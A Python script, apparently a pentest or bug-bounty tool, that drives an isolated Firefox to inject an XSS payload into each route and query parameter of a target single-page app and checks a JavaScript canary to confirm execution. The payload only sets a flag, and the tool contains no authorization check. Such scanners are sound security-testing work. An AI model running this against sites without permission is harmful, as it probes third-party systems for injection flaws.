#!/usr/bin/env python3
"""spa_param_xss_matrix.py — browser-verified reflected/DOM XSS matrix for SPAs.

Why this exists: on a modern SPA (Angular/React/Vue, SSR or not) a reflection grep tells you
NOTHING. The framework may re-escape the value on render, or only embed it in a JSON state
blob. This runner navigates the real app in an isolated Firefox and scores three independent
signals per (route, param) pair:

    raw   -> payload present verbatim in document.documentElement.outerHTML
    flag  -> the execution canary window.__XSS fired
    img   -> a real <img src=x> node exists in the live DOM

Only `flag` (or img+raw together, verified by hand) is an execution. `raw` alone is usually
framework state — investigate, do not report.

PREREQUISITES (see skill `browser-isolation`):
  firefox --no-remote --new-instance --profile /tmp/ff-iso --no-sync --marionette 2828 about:blank &
  ss -ltnp | grep -E '282[0-9]'          # confirm the port that ACTUALLY bound
  pip3 install --break-system-packages marionette_driver

USAGE:
  python3 spa_param_xss_matrix.py https://target.tld /en/home /en/search /en/error
  python3 spa_param_xss_matrix.py https://target.tld --routes routes.txt --params params.txt
  MARIONETTE_PORT=2828 python3 spa_param_xss_matrix.py ...

Output: one line per HIT + optional JSON written to xss_matrix_results.json.
Exit code 0 always (a 0-hit run is a valid result, not an error).
"""
import json
import os
import sys
import time
import urllib.parse

try:
    from marionette_driver.marionette import Marionette
except ImportError:
    sys.exit("pip3 install --break-system-packages marionette_driver")

PAYLOAD = '"><img src=x onerror="window.__XSS=1">'
CANARY_JS = r"""
  const p = %s;
  return JSON.stringify({
    url: location.href,
    flag: window.__XSS === 1,
    raw: document.documentElement.outerHTML.indexOf(p) !== -1,
    img: !!document.querySelector('img[src="x"]'),
    title: document.title
  });
""" % json.dumps(PAYLOAD)

DEFAULT_ROUTES = ["/", "/search", "/error", "/login", "/register"]
DEFAULT_PARAMS = [
    "q", "query", "searchTerm", "errorKey", "errorType", "returnUrl", "redirect",
    "page", "pageSize", "sortKey", "view", "categoryId", "sku", "code", "state",
    "message", "id", "slug", "name", "filter",
]


def load_list(path):
    with open(path) as fh:
        return [ln.strip() for ln in fh if ln.strip() and not ln.startswith("#")]


def main():
    args = [a for a in sys.argv[1:]]
    base = args.pop(0) if args and not args[0].startswith("-") else None
    if not base:
        sys.exit(__doc__)
    base = base.rstrip("/")

    routes, params = [], []
    while args:
        a = args.pop(0)
        if a == "--routes":
            routes = load_list(args.pop(0))
        elif a == "--params":
            params = load_list(args.pop(0))
        elif a.startswith("/"):
            routes.append(a)
    routes = routes or DEFAULT_ROUTES
    params = params or DEFAULT_PARAMS

    port = int(os.environ.get("MARIONETTE_PORT", "2828"))
    wait = float(os.environ.get("LOAD_WAIT", "3.0"))

    m = Marionette("localhost", port=port)
    m.start_session()

    hits, checked = [], 0
    for route in routes:
        for param in params:
            url = "%s%s?%s=%s" % (base, route, param, urllib.parse.quote(PAYLOAD, safe=""))
            try:
                m.navigate(url)
            except Exception as exc:                     # noqa: BLE001
                print("NAVFAIL %s %s %s" % (route, param, str(exc)[:80]))
                continue
            time.sleep(wait)
            try:
                data = json.loads(m.execute_script(CANARY_JS))
            except Exception as exc:                     # noqa: BLE001
                print("JSFAIL  %s %s %s" % (route, param, str(exc)[:80]))
                continue
            checked += 1
            if data["flag"] or data["raw"] or data["img"]:
                hits.append({"route": route, "param": param, **data})
                print("HIT? %-14s %-14s flag=%s raw=%s img=%s  %s"
                      % (route, param, data["flag"], data["raw"], data["img"], data["url"]))

    m.delete_session()
    with open("xss_matrix_results.json", "w") as fh:
        json.dump({"payload": PAYLOAD, "checked": checked, "hits": hits}, fh, indent=1)
    print("\n=== checked %d combinations, %d flagged ===" % (checked, len(hits)))
    print("Reminder: flag=True is execution. raw-only is usually framework state — verify by hand.")


if __name__ == "__main__":
    main()
